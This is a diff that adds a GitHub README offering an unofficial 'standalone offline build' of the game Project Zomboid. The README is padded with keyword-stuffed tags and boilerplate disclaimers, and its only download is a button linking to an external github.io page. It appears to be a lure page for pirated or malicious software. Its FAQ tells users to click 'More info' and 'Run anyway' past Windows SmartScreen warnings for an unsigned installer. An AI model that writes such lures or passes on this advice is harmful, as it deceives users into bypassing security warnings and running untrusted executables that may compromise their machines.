@@ -1,3 +1,237 @@
-# Project Zomboid
+<div align="center">
 
-Utility scaffolding.
+# 🎮 Project Zomboid -- gaming client / mod toolkit 2026: Standalone Offline Build for Windows 11
+
+<img src="https://img.shields.io/badge/platform-windows_10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform"> <img src="https://img.shields.io/badge/release-v2026.1-24292F?style=for-the-badge" alt="Release"> <img src="https://img.shields.io/badge/updated-2026--11--15-6E7781?style=for-the-badge" alt="Updated"> <img src="https://img.shields.io/badge/status-stable-2EA043?style=for-the-badge" alt="Status"> <img src="https://img.shields.io/badge/languages-12%2B-8250DF?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages">
+
+</div>
+
+## 📦 Intro
+
+This repository distributes a standalone offline Windows x64 build intended for the Project Zomboid -- gaming client / mod toolkit workflow. The distribution package bundles the client, the mod tooling chain, and the supporting runtime into a single self-contained setup for Windows 10 and 11. It is published by independent maintainers as a reproducible offline deployment bundle.
+
+Offline deployment matters for air-gapped workstations, bandwidth-constrained environments, and cases where a reproducible install must be staged once and reused across many machines. This distribution targets those scenarios by shipping a single archived package that can be moved on removable media or an internal share. Nothing in the build requires an account or a live connection at install time beyond the initial retrieval step.
+
+The build is x64 only and ships both portable and installed deployment modes. A single Project Zomboid -- gaming client / mod toolkit on Windows deployment covers the client binary, the mod toolkit scripts, and the bundled translation catalogs. Portability is preserved by design: the same archive can be expanded to a USB stick or staged into a fixed program directory without changes.
+
+## 01 · ⬇️ Download
+
+<p align="center">
+  <a href="https://super-quail-dev.github.io/project-zomboid-desktop">
+    <picture>
+      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
+      <img src="docs/buttons/installer-card.svg" alt="" width="440">
+    </picture>
+  </a>
+</p>
+
+<p align="center">
+  <img src="docs/buttons/banner.png" alt="Project Zomboid -- gaming client / mod toolkit 2026 standalone build running on Windows 11, interface banner" width="100%">
+</p>
+
+## 02 · ✨ Features
+
+<table>
+<tr>
+<td width="33%" valign="top">
+
+**🎮 Client Runtime**
+
+Self-contained x64 client binary, no external runtime dependencies, staged into a single program directory.
+
+</td>
+<td width="33%" valign="top">
+
+**🧩 Mod Toolkit**
+
+Scripted packaging and validation helpers for the mod authoring and testing workflow on Windows.
+
+</td>
+<td width="33%" valign="top">
+
+**📦 Portable Mode**
+
+Expand-to-folder deployment with no registry writes, suitable for removable media and shared workstations.
+
+</td>
+</tr>
+<tr>
+<td valign="top">
+
+**🔐 SHA256 Manifest**
+
+Every release ships a signed-off hash manifest so archived builds can be re-verified after transfer.
+
+</td>
+<td valign="top">
+
+**🌐 Offline Catalog**
+
+Bundled translation catalogs and locale files, no network fetch required at first launch.
+
+</td>
+<td valign="top">
+
+**🧰 Scripted Setup**
+
+PowerShell entry points for silent and attended deployment, with logged output and exit codes.
+
+</td>
+</tr>
+</table>
+
+## 03 · ⚙️ How it works
+
+The distribution package is a single archived directory tree. On expansion it lays out a `bin` folder with the client binary and helper executables, a `tools` folder with the mod toolkit scripts, a `resources` folder with locale and asset catalogs, and a `docs` folder with the offline reference. Nothing is written outside the selected program directory during the extract step.
+
+First-run initialization registers the build with the current Windows user profile. The build writes its default configuration into `%APPDATA%` under a per-user application directory, and if a system-wide install path is chosen the installer additionally stages a start menu entry. No Windows service is installed and no scheduled task is registered.
+
+At runtime the build operates fully offline. There is no update service and no background network listener: updates are handled by running a newer versioned package over the existing installation, which preserves user configuration and project files. File association handlers for the toolkit file formats are optional and are only registered if you opt in during setup.
+
+The only external integration surface is the Windows shell and the per-user profile directory. The build does not touch system directories, does not modify shared runtime libraries, and can coexist with a separately installed upstream build in a different directory as long as file associations are not both claimed.
+
+## 04 · 🧩 Compatibility
+
+The build supports Windows 10 and Windows 11 on x64 only. Both the Home and Pro editions of each are supported, with no minimum build number enforced beyond a current cumulative update. 32-bit Windows and Server SKUs are not supported targets.
+
+Deployment scripts are written against PowerShell 5.1 and are tested against PowerShell 7 and later. The attended and silent install entry points use only inbox cmdlets; no additional PowerShell modules are downloaded or imported from the gallery.
+
+The build runs comfortably on a modern quad-core CPU with 8 GB of RAM and a few gigabytes of available disk space. Nothing in the deployment path requires a dedicated GPU; hardware acceleration is optional and disabled by default in the portable mode.
+
+When an upstream build is already present on the machine, the standalone distribution still installs cleanly into its own directory. File associations are the only shared surface, and the installer leaves existing handlers untouched unless you explicitly request the takeover. Portable mode never registers associations.
+
+## 05 · 🔧 Requirements
+
+| Component | Supported | Preferred |
+| --- | --- | --- |
+| OS | Windows 10 | Windows 11 |
+| Shell | PowerShell 5.1+ | PowerShell 7+ |
+| Network | Required to download | Stable broadband |
+| Privileges | Standard user access | Standard user access |
+
+## 06 · ❓ FAQ
+
+### 🔒 Is this standalone build safe to install on Windows?
+
+> [!CAUTION]
+> On first run, Windows SmartScreen may warn for unsigned installers. Click **More info**, then **Run anyway** to continue. The build is an offline setup file; keep your antivirus enabled as usual.
+
+### 🪟 Which Windows versions does the build support?
+
+> [!NOTE]
+> The build runs on Windows 10 and Windows 11 on x64. Older Windows releases and 32-bit targets are not supported.
+
+### 📡 Can I use the build offline?
+
+> [!TIP]
+> Yes. After install, the build runs without a network connection. Only the initial retrieval step needs internet access.
+
+### 🔄 How do updates work?
+
+> [!NOTE]
+> Updates ship as a newer versioned installer; running it over the existing install preserves your projects, templates, and preferences. No separate updater service is required.
+
+### 🗑️ How do I uninstall it on Windows?
+
+> [!WARNING]
+> Open Settings, then Apps, then Installed apps, find the entry in the list, and choose Uninstall. Personal project files remain on disk unless you remove them manually.
+
+### ⚙️ What are the technical specifications?
+
+> [!IMPORTANT]
+> - **System load:** A modern quad-core CPU with 8 GB of RAM keeps the client and the mod toolkit comfortable during scripted test runs.
+> - **File formats:** The toolkit reads and writes JSON manifests, Lua script bundles, and PNG sprite atlases.
+> - **Portable build:** A portable variant is included, and it expands into any writable folder without installer involvement.
+
+### 🔐 How do I verify the file with SHA256?
+
+> [!CAUTION]
+> Open PowerShell in the folder with the installer and run `Get-FileHash setup.exe -Algorithm SHA256`. Compare the output with the hash published alongside the release. If they do not match, delete the file and fetch it again.
+
+### 🛡️ Does the build require administrator rights?
+
+> [!TIP]
+> Standard user access is sufficient for the default install location. Administrator rights are only requested if you choose a system-wide install path during setup.
+
+### 📂 Where does the build place its files?
+
+> [!NOTE]
+> By default, the installer uses the per-user program directory for the application and the user profile for configuration. No files are written to Windows system directories.
+
+### 📶 Does the build collect telemetry?
+
+> [!TIP]
+> This standalone build does not include telemetry or usage reporting. All processing happens locally on the Windows host.
+
+### 🐛 How do I report an issue?
+
+> [!NOTE]
+> Open a new issue on this repository with Windows version, build hash, and the reproduction steps. Include any installer log lines from `%TEMP%` if available.
+
+### ❔ How is this build different from an upstream release?
+
+> [!IMPORTANT]
+> This repository publishes a standalone offline distribution packaged by this project. It is independent from any upstream vendor release and is not endorsed by or affiliated with any third-party trademark holder. See the Disclaimer section below for full details.
+
+## 07 · 📜 Disclaimer
+
+**Independent distribution.** This repository publishes a standalone offline build packaged by independent maintainers. It is not an official release from any third-party vendor and is not sponsored, endorsed by, or affiliated with any trademark holder whose product name may be referenced in this documentation.
+
+**Trademarks.** All product names, logos, and brands referenced in this repository are the property of their respective owners. Use of these names does not imply any endorsement. All third-party trademarks remain the property of their respective holders and are used here solely for descriptive and identification purposes, consistent with nominative fair use.
+
+**Educational and research use.** This distribution is published for educational, research, and personal deployment purposes. Users are solely responsible for ensuring their use of any software installed through this build complies with the applicable end-user license agreement of the upstream vendor and with local law.
+
+**No warranty.** This build is provided on an "as is" basis, without warranty of any kind, express or implied. The maintainers make no representation that the build is complete, accurate, up to date, or fit for any particular purpose, and disclaim all liability arising from its use.
+
+**Reporting.** If you are a rights holder and believe content in this repository infringes your rights, please open an issue on the repository or contact the repository owner through the GitHub profile page. Good-faith reports will be reviewed promptly.
+
+**Scope.** This disclaimer applies to the entire contents of this repository, including the README, release artifacts, button graphics, and any linked distribution pages.
+
+## 08 · 📄 License
+
+- The repository contents (README, scripts, button graphics, build artifacts) are released under **CC BY-SA 4.0**.
+- You may redistribute and adapt the repository contents, including for commercial purposes, with attribution.
+- Attribution requires a link back to this repository and an indication of changes made.
+- Derivative works must be released under the same CC BY-SA 4.0 license.
+- The license applies ONLY to the contents of this repository, not to any upstream vendor software referenced by it.
+- Upstream vendor software remains subject to its own end-user license agreement; this repository does not grant any license to that software.
+- This license may be updated over time; the current version is always the one in the `LICENSE` file at the repository root.
+- For questions about license scope, open an issue on this repository.
+
+## 09 · 🏷️ Topics
+
+<div align="center">
+
+**Project Zomboid -- gaming client / mod toolkit** · Game Utility Workflow · Mod Toolkit · Portable Mode · Offline Catalog · SHA256 Manifest · Scripted Setup · Windows 10 / 11
+
+</div>
+
+<br>
+
+<div align="center">
+<sub><b>Related topics:</b> Project Zomboid -- gaming client / mod toolkit for Windows 11 · Project Zomboid -- gaming client / mod toolkit on Windows 10 · Project Zomboid -- gaming client / mod toolkit 2026 · Project Zomboid -- gaming client / mod toolkit mod toolkit workflow · Project Zomboid -- gaming client / mod toolkit script packaging · Project Zomboid -- gaming client / mod toolkit portable mode · Project Zomboid -- gaming client / mod toolkit standalone build</sub>
+</div>
+
+<details>
+<summary><sub>Dev tags</sub></summary>
+
+<br>
+
+`python` `powershell` `scripts` `automation` `developer-tools` `open-source` `software-engineering` `windows-deployment` `reproducible-builds` `sha256-verification` `portable-apps` `game-utility` `mod-tooling` `game-client` `lua-scripting` `sprite-atlas` `json-manifests` `project-zomboid` `project-zomboid-2026` `project-zomboid-windows` `project-zomboid-for-windows-10` `project-zomboid-for-windows-11` `project-zomboid-64bit` `project-zomboid-x64` `project-zomboid-portable` `project-zomboid-standalone` `project-zomboid-workflow` `project-zomboid-desktop` `project-zomboid-latest` `project-zomboid-english` `project-zomboid-multilingual` `windows-10` `windows-11` `x64-desktop`
+
+</details>
+
+## ⬇️ Download
+
+<p align="center">
+  <a href="https://super-quail-dev.github.io/project-zomboid-desktop">
+    <picture>
+      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
+      <img src="docs/buttons/installer-card.svg" alt="" width="440">
+    </picture>
+  </a>
+</p>
+
+<p align="center">
+  <img src="docs/buttons/banner.png" alt="Standalone offline build banner for Windows" width="100%">
+</p>
